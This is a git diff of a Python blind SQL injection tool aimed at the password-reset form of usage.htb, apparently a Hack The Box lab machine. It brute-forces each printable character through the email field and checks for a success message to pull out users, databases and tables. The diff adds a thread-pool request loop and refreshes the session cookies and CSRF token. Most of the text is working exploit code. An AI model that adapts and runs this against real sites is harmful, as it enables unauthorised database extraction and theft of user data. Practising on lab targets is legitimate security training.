@@ -8,6 +8,8 @@ import os
 import re
 import math
 import threading
+import multiprocessing
+import concurrent.futures
 import copy
 from pwn import *
 
@@ -29,6 +31,12 @@ class Color:
 class WrapperResponse:
     def __init__(self, text, character):
         self.text = text
+        self.character = character
+
+
+class WrapperRequest:
+    def __init__(self, data, character):
+        self.data = data
         self.character = character
 
 
@@ -61,23 +69,21 @@ signal.signal(signal.SIGINT, ctrlC)
 main_url = "http://usage.htb/forget-password"
 method = "POST"
 headers = {
-    "Cookie": "XSRF-TOKEN=eyJpdiI6Ikd0eTJCRnJ6S2VTYkszVkJqdUl6dXc9PSIsInZhbHVlIjoiMHk5Yy8xMnpjR2hFWndPeDB5UzhCN2N2YVhGK1dBOWhPZG5rRUdKdnNRMTd2aUdLcXNYOU13ckI5MTBNZXJDMHFiVTl3YTNqalQ5Z20xaVB6cjBqMDdnSDZmVmx2SnpkNEw3UWtjSzhHT0VIZDZnbi9XZHhhYnVXVGM3YndjRGwiLCJtYWMiOiJiYzU5NjVmYWI1YzMyMmMxNjU2MWZmMTU1YjU5ZDhmZjc4OGEwOWY0MjI5ZjhkYTQ3M2U3YmE2NjYyNjk5NjVmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InZiRU9DUHlKNGM4QUxmUUl2bWpNb2c9PSIsInZhbHVlIjoiSVZmQ2NObU9WU251dnVpeEMxVXY5U20vWnZwUWVMM2JWc3JrcGlIT0dSeE96TzNGUHBGUlV5V3Z6bWFTeW51Z0RVa3BWb0lvMUM4YndVQVdYSkR0ZXJRdlJhSHpwNUxDOFZoRTNDWmJkZ3Z3c3NXYUFDQzBoL3E0SmtSNWxWNW8iLCJtYWMiOiJhNzc1NDMxNDk5NzgyYjliY2QxMmM0OGFiZjlmN2MwZTkxZjFkZTk0OTk2ZDIxYTc2NGMzMWJlMmI4NTI2ZjkzIiwidGFnIjoiIn0%3D"
+    "Cookie": "XSRF-TOKEN=eyJpdiI6Ik5UdHlSV1BvNlN1Z3Z0cnc5eVhWZ0E9PSIsInZhbHVlIjoiU1JaUXFXTzVhTUtmdFZtL3NoSjZycmR3TFp6MVhvRktKeUlrV1Y3ZCtsd0c3eG05a2JRMjg0YUtxQWVaK21mazBRTVZBNTlSU1E1d2VMbUZXZS9JdE5MTVVQNzFDMVZlTEl4M0Zydk5NbU1zTWx1RWZmUmNOVjE1UEt5S2U3SE0iLCJtYWMiOiIyZDMyY2U2YTU1NmIxMjBiNmZlYWEwYTc1MDQ3M2VjNmRhMDNjNDI5NTcyNDNlNmNlYzM1OTg5YTA4OGFhNmJhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkZHTUNLNW9GaHA3ejR5NFVDRlk4SHc9PSIsInZhbHVlIjoicWxrSEVwakFtdFRydW9MMWhhZ3Q0c2JkVlI1MFNYVk1iSTFkUUoyanVWem9KQnFWVEo2WGFDV3RLNmRHajFweGd5ai9MSkowSHJQRnFKWUMwZHRVRkdtNWdvR0J2dHdBZGd5ZDBkUm1hMHhzVXJEUkNVOTYyMnFMY0RFNlVieGoiLCJtYWMiOiJjYWNkNTY2N2UzZGU3Y2I0MmUyZTIxYWU3MmVlYWVjODMyZmZkZTAyNzRhNTczMGQ0NTZiMmEyMDU2YmI5NGIwIiwidGFnIjoiIn0%3D"
 }
 post_data = {
-    "_token": "uvmUnrDZgvdzPLynmIahMEaUlsV16Ctha9P4np03",
+    "_token": "nvjaHdA6sxbYR3fG4wKK5szM3yP43Om78wIAh6ma",
     "email": "test@gmail.com",
 }
 post_data_exploit = "email"
 get_data = ""
 condition = "We have e-mailed your password reset link to"
-num_threads = 5
+num_threads = 1
 dbs = []
-threads = []
-responses = []
 
 
 # Functions
-def set_payload(exploit, position, character, db, table):
+def build_payload(exploit, position, character, db, table):
     result = ""
 
     if exploit == "User":
@@ -95,21 +101,60 @@ def set_payload(exploit, position, character, db, table):
     return result
 
 
-def send_request(data, character):
+def build_data(info_name, position, db, table):
+    result = []
+    characters = list(range(33, 127))
 
-    response = requests.post(main_url, headers=headers, data=data)
-    responses.append(WrapperResponse(response.text, character))
+    for character in characters:
+        payload = f"{post_data[post_data_exploit]}{build_payload(info_name,position,character, db, table)}"
+        data = copy.copy(post_data)
+        data[post_data_exploit] = payload
+        result.append(WrapperRequest(data, character))
+
+    return result
+
+
+def send_request(requests_data):
+
+    response = requests.post(main_url, headers=headers, data=requests_data.data)
+    return WrapperResponse(response.text, requests_data.character)
+    # responses.append(WrapperResponse(response.text, character))
 
 
 def get_info(label_info, label_menu, info_name, db=None, table=None):
 
+    # num_processes = multiprocessing.cpu_count()
+    num_processes = 1
+    print(f"Procesadores: {num_processes}")
     info = ""
     position = 1
+    find_characters = True
 
-    while True:
-        characters = list(reversed(range(33, 127)))
-        notFindCharacters = True
+    while find_characters:
+        find_characters = False
 
+        requests_data = build_data(info_name, position, db, table)
+
+        # with multiprocessing.Pool(num_processes) as pool:
+        # responses = pool.map(send_request, requests_data)
+
+        with concurrent.futures.ThreadPoolExecutor(
+            max_workers=num_processes
+        ) as executor:
+            responses = list(executor.map(send_request, requests_data))
+
+        for response in responses:
+            print(response.character)
+            if condition in response.text:
+                info += chr(response.character)
+                label_info.status(f"{Color.GREEN}{info}{Color.END}")
+                find_characters = True
+                break
+
+        position += 1
+
+
+"""
         while notFindCharacters and len(characters) != 0:
 
             for _ in range(num_threads):
@@ -122,7 +167,7 @@ def get_info(label_info, label_menu, info_name, db=None, table=None):
                 data = copy.copy(post_data)
                 data[post_data_exploit] = payload
 
-                label_menu.status(f"position: {position}, character: {character}")
+                label_menu.status(f"position: {position}, character: {chr(character)}")
 
                 thread = threading.Thread(
                     target=send_request,
@@ -137,15 +182,12 @@ def get_info(label_info, label_menu, info_name, db=None, table=None):
             for response in responses:
                 if condition in response.text:
                     print(f"find character: {response.character}")
-                    info += str(response.character)
+                    info += chr(response.character)
                     label_info.status(f"{Color.GREEN}{info}{Color.END}")
                     notFindCharacters = False
                     responses.clear()
                     break
-
-        position += 1
-        if notFindCharacters:
-            break
+"""
 
 
 def get_user(label_menu):
